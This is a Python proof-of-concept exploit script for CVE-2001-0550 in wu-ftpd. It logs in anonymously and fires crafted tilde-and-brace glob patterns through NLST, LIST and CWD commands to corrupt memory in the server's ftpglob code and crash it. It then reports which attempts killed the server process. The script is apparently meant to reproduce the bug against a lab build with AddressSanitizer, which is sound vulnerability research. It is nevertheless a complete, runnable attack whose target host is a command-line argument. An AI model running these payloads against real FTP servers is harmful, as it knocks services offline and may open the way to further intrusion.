#!/usr/bin/env python3
"""
PoC: CVE-2001-0550 - wu-ftpd glob (ftpglob) heap corruption.

Target: a REAL build-from-source wu-ftpd 2.6.0 (same vulnerable ftpglob()/
glob.c as 2.6.1), compiled with AddressSanitizer
(Dockerfile.ftp-wuftpd-cve-2001-0550-real).

Path to the bug:
  anonymous login -> NLST/LIST/STAT with a "~{"-style glob pattern ->
  ftpd send_file_list() / ls path -> ftpglob() in src/glob.c -> the fixed-size
  gpath buffer and unbounded brace/tilde expansion corrupt the heap.

We log in anonymously (USER ftp / PASS x@x.com), then fire a battery of
glob patterns. On the ASan build the corruption is detected at the point of
the bad heap access and the in.ftpd child aborts; ASan writes a
"heap-buffer-overflow" / "SEGV" report to stderr (captured to
/tmp/ftpd-asan.log inside the container).

Usage:
    python3 ftp_wuftpd_cve_2001_0550_real_poc.py [host] [port]
Default: 127.0.0.1 12201
"""

import socket
import sys
import time


# Glob patterns that drive ftpglob() into its broken tilde+brace expansion.
#
# VERIFIED on the ASan build: "~a{,}" (a "~<user>{...}" form) reaches
#   send_file_list -> ftpglob -> collect -> acollect -> expand -> execbrc
#   -> expand   (glob.c:207, strcpy(gpath, gpath+1))
# and AddressSanitizer aborts the in.ftpd child with "strcpy-param-overlap"
# inside the ftpglob 'agpath' stack frame. The "~<x>{,}" shape is what survives
# wu-ftpd's internal fixpath() (a bare "~{" gets reduced to "*" and is handled
# cleanly), so the tilde must be followed by a (non-existent) username and a
# brace group. We lead with the verified trigger, then a spread of variants.
PATTERNS = [
    "~a{,}",      # <-- verified ASan crash (glob.c:207)
    "~zz{,}",
    "~q{a,b}",
    "~x{,}{,}",
    "~user/{,}",
    "~b{,}{,}{,}",
    "~{,}",
    "~/{,}",
    "{,}~{,}",
    "~{",
]

# Commands that route attacker input into the glob code. NLST -> send_file_list
# -> ftpglob is the verified path. (STAT uses an external ls via popen and does
# NOT reach ftpglob; LIST needs a data channel. NLST runs ftpglob inline first.)
GLOB_CMDS = ["NLST", "LIST", "CWD"]


def recv_all(s, timeout=3.0, want_line=True):
    """Read until a CRLF-terminated FTP reply line arrives (or timeout)."""
    s.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if want_line and buf.endswith(b"\r\n"):
                break
            if not want_line and len(chunk) < 4096:
                break
    except (TimeoutError, OSError):
        pass
    return buf


def login(host, port, timeout=12.0):
    # NOTE: wu-ftpd does a reverse-DNS / ident lookup on connect that adds a
    # ~3s stall before the 220 banner in this sandbox, so timeouts are generous.
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    banner = recv_all(s, timeout=timeout)
    if b"220" not in banner:
        raise RuntimeError(f"no 220 banner: {banner!r}")
    s.sendall(b"USER ftp\r\n")
    r1 = recv_all(s)
    s.sendall(b"PASS x@x.com\r\n")
    r2 = recv_all(s)
    if b"230" not in r2:
        raise RuntimeError(f"login failed: {r1!r} / {r2!r}")
    return s, banner, r2


def fire(host, port, cmd, pattern):
    """One fresh connection per attempt (in.ftpd is per-connection)."""
    try:
        s, banner, _ = login(host, port)
    except Exception as e:  # noqa: BLE001
        return ("login-error", repr(e))
    try:
        line = f"{cmd} {pattern}\r\n".encode("latin-1", "replace")
        s.sendall(line)
        time.sleep(0.4)
        resp = recv_all(s, timeout=3.0)
        # Reissue something benign to detect a dead/aborted child.
        try:
            s.sendall(b"NOOP\r\n")
            noop = recv_all(s, timeout=2.0)
        except Exception:  # noqa: BLE001
            noop = b""
        alive = b"200" in noop or b"500" in noop or len(noop) > 0
        return ("ok", {"resp": resp[:200], "alive": alive, "noop": noop[:80]})
    except (ConnectionResetError, BrokenPipeError) as e:
        return ("conn-reset", repr(e))  # child likely crashed mid-command
    except Exception as e:  # noqa: BLE001
        return ("error", repr(e))
    finally:
        try:
            s.close()
        except Exception:  # noqa: BLE001
            pass


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 12201

    print(f"[*] CVE-2001-0550 PoC -> {host}:{port}")
    try:
        s, banner, login_resp = login(host, port)
        s.close()
        print(f"[+] banner: {banner.decode('latin-1', 'replace').strip()}")
        print(f"[+] anonymous login OK: {login_resp.decode('latin-1','replace').strip()}")
    except Exception as e:  # noqa: BLE001
        print(f"[-] could not establish baseline login: {e}")
        sys.exit(2)

    crashed = []
    for cmd in GLOB_CMDS:
        for pat in PATTERNS:
            status, detail = fire(host, port, cmd, pat)
            tag = pat if len(pat) <= 24 else pat[:21] + "..."
            print(f"[*] {cmd:5} {tag:<28} -> {status}")
            if status in ("conn-reset",) or (
                status == "ok" and isinstance(detail, dict) and not detail["alive"]
            ):
                crashed.append((cmd, pat, status, detail))

    print()
    if crashed:
        print(f"[+] {len(crashed)} attempt(s) produced a dead/reset child (probable crash):")
        for cmd, pat, status, detail in crashed:
            tag = pat if len(pat) <= 24 else pat[:21] + "..."
            print(f"      {cmd} {tag!r}  ({status})")
        print()
        print("[!] Confirm the AddressSanitizer heap/glob report in the container:")
        print("      docker exec <container> grep -A30 'ERROR: AddressSanitizer' /tmp/ftpd-asan.log")
        print("    Expected: 'strcpy-param-overlap' (or SEGV) with a frame in")
        print("    expand/execbrc/ftpglob at src/glob.c, reached via send_file_list (NLST).")
        print("    Child processes exit on signal 6 (SIGABRT) -> see `docker logs`.")
    else:
        print("[-] no obvious child crash observed from the wire.")
        print("    Inspect /tmp/ftpd-asan.log and `docker logs` for ASan output anyway")
        print("    (ASan abort may close the socket cleanly).")


if __name__ == "__main__":
    main()
